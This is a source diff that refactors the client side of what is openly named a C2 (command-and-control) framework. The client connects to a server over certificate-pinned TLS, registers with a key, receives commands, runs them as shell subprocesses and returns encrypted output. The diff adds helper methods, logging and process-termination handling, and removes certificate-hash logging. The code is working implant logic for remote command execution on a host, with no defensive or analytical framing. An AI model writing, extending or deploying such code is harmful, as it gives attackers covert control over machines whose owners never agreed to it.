@@ -72,6 +72,7 @@ class C2Client:
         self.running = True
         self.command_queue = asyncio.Queue()
         self.shutdown_event = asyncio.Event()
+        self.execution_process = None
     
     async def connect(self) -> bool:
         """
@@ -95,8 +96,6 @@ class C2Client:
             ssl_obj = self.writer.get_extra_info("ssl_object")
             der_cert = ssl_obj.getpeercert(binary_form=True)
             server_sha_received = get_spki_hash(der_cert)
-            logger.info(f"Server certificate: {server_sha_received}")
-            logger.info(f"Expected certificate: {server_sha}")
             if server_sha_received != server_sha:
                 logger.error("Server certificate is not valid")
                 await self._reset_writer_reader()
@@ -104,10 +103,7 @@ class C2Client:
 
             # Send registration message with client's public key
             client_public_key = self.key_manager.serialized_public_key
-            await send_message(
-                self.writer,
-                Message.as_register(self.client_id, client_public_key).to_payload(True)
-            )
+            await self._send_register(self.client_id, client_public_key)
             
             # Receive acknowledgment with server's public key
             msg = await receive_message(self.reader)
@@ -179,6 +175,7 @@ class C2Client:
             await self._cancel_tasks(tasks)
             # Clear connection state
             await self._reset_writer_reader()
+            logger.info('Main loop done')
 
     async def _reset_writer_reader(self):
         try:
@@ -243,6 +240,7 @@ class C2Client:
                 
                 if msg.type is MessageType.COMMAND:
                     if msg.command == CommandType.KILL.value:
+                        logger.info("[_command_listener] Received kill command")
                         await self._terminate_execution_process()
                         self._drain_queue()
                     # Queue command for execution
@@ -263,14 +261,14 @@ class C2Client:
             logger.error(f"Command listener error: {e}")
 
     def _drain_queue(self):
-        while not self.command_queue.empty():
-            try:
+        try:
+            while not self.command_queue.empty():
                 cmd_data = self.command_queue.get_nowait()
                 self.command_queue.task_done()
                 logger.info(f"Drained command: {cmd_data.get('command', '')}")
-            except asyncio.QueueEmpty:
-                break
-        logger.info("Drained command queue")
+            logger.info("Drained command queue")
+        except asyncio.QueueEmpty:
+            logger.info("Command queue is empty")
     
     async def _command_processor(self):
         """
@@ -279,7 +277,6 @@ class C2Client:
         try:
             while self.running:
                 cmd_data = await self.command_queue.get()
-                
                 cmd_id = cmd_data.get("cmd_id")
                 command = cmd_data.get("command", "").lower()
                 
@@ -288,36 +285,17 @@ class C2Client:
                     break
                 
                 logger.info(f"Executing: {command}")
-                
                 start_time = time.monotonic()
-                
-                if command == CommandType.KILL.value:
-                    logger.info("Processing kill command")
-                    result = "Client killed by server"
-                    self.running = False
-                    # Close reader to stop listener from reading
-                    if self.reader:
-                        self.reader.feed_eof()
-                
-                else:
-                    # Run command asynchronously in thread pool
-                    result = await self._execute_command(command)
-                
+                result = await self._process_command(command)
                 exec_time_ms = (time.monotonic() - start_time) * 1000
                 
                 # Send result back to server
-                msg = Message.as_result(cmd_id, result, exec_time_ms)
-                msg = self._encryption_manager.encrypt(msg)
-                success = await send_message(
-                    self.writer,
-                    msg
-                )
-                if success:
+                if await self._send_result(cmd_id, result, exec_time_ms):
                     logger.info(f"Result sent ({exec_time_ms:.1f}ms)")
                 else:
                     logger.debug("Failed to send result - connection lost")
                     break
-                
+
                 # Exit after sending kill result
                 if not self.running:
                     return
@@ -326,6 +304,40 @@ class C2Client:
             logger.info('command_processor cancelled')
         except Exception as e:
             logger.error(f"Command processor error: {e}")
+
+    async def _process_command(self, command: str) -> str:
+        if command == CommandType.KILL.value:
+            result = self._process_kill_command()
+        else:
+            result = await self._execute_command(command)  # Run asynchronously with subprocess
+        return result
+    
+    def _process_kill_command(self) -> str:
+        """Process kill command"""
+        logger.info("Processing kill command")
+        self.running = False
+        # Close reader to stop listener from reading
+        if self.reader:
+            self.reader.feed_eof()
+        return "Client killed by server"
+    
+    async def _send_result(self, command_id: str, result: str, execution_time_ms: str) -> bool:
+        msg = Message.as_result(command_id, result, execution_time_ms)
+        msg = self._encryption_manager.encrypt(msg)
+        return await send_message(
+            self.writer,
+            msg
+        )
+
+    async def _send_register(self, client_id: str, public_key: str) -> bool:
+        """
+        Send registration message to server
+        """
+        msg = Message.as_register(client_id, public_key)
+        return await send_message(
+            self.writer,
+            msg.to_payload(True)
+        )
 
     async def _execute_command(self, command: str) -> str:
         """
@@ -347,6 +359,7 @@ class C2Client:
             
             # Combine stdout and stderr
             stdout, stderr = await self.execution_process.communicate()
+            # self.execution_process = None
             output = stdout.decode() + (f"\n[stderr] {stderr.decode()}" if stderr else "")
             return output if output else "[No output]"
         except asyncio.CancelledError:
@@ -359,33 +372,54 @@ class C2Client:
 
     async def _terminate_execution_process(self):
         """Terminate execution process if it exists"""
+        logger.info("Terminating execution process")
         if not self.execution_process:
             return
-        p = self.execution_process
         try:
-            if is_windows():
-                p.send_signal(signal.CTRL_BREAK_EVENT)
-            else:
-                os.killpg(p.pid, signal.SIGTERM)
-
-            await asyncio.wait_for(p.wait(), timeout=SUBPROCESS_TERMINATION_GRACE_TIME_S)
+            await self._terminate_subprocess_gracefully(self.execution_process)
         except asyncio.TimeoutError:
-            p.kill()
-            await p.wait()
+            logger.error("Terminating process timed out")
+        except Exception as e:
+            logger.error(f"Error terminating process: {e}")
+        finally:
+            await self._terminate_subprocess_forcefully(self.execution_process)
+
+    @staticmethod
+    async def _terminate_subprocess_gracefully(process: subprocess):
+        """Terminate a subprocess gracefully"""
+        if is_windows():
+            process.send_signal(signal.CTRL_BREAK_EVENT)
+        else:
+            os.killpg(process.pid, signal.SIGTERM)
+        await asyncio.wait_for(
+            process.wait(),
+            timeout=SUBPROCESS_TERMINATION_GRACE_TIME_S
+        )
+
+    @staticmethod
+    async def _terminate_subprocess_forcefully(process: subprocess):
+        """Terminate a subprocess forcefully"""
+        try:
+            process.kill()
+            await process.wait()
+        except Exception as e:
+            logger.error(f"Error forcefully killing process: {e}")
     
     async def start(self):
         """Start the C2 client"""
         logger.info(f"Starting C2 client (ID: {self.client_id})")
         
         # Start with reconnect loop - it handles both initial connection and reconnections
-        while self.running:
-            try:
+        try:
+            while self.running:
                 await self.reconnect_loop()
                 if self.reader and self.writer:
                     await self.main_loop()
-            except Exception as e:
-                logger.error(f"Client start error: {e}")
-                await asyncio.sleep(1)  # Prevent tight loop on repeated failures
+        except asyncio.CancelledError:
+            logger.info("Client start cancelled")
+        except Exception as e:
+            logger.error(f"Client start error: {e}")
+            await asyncio.sleep(1)  # Prevent tight loop on repeated failures
 
 # ==================== MAIN ====================
 
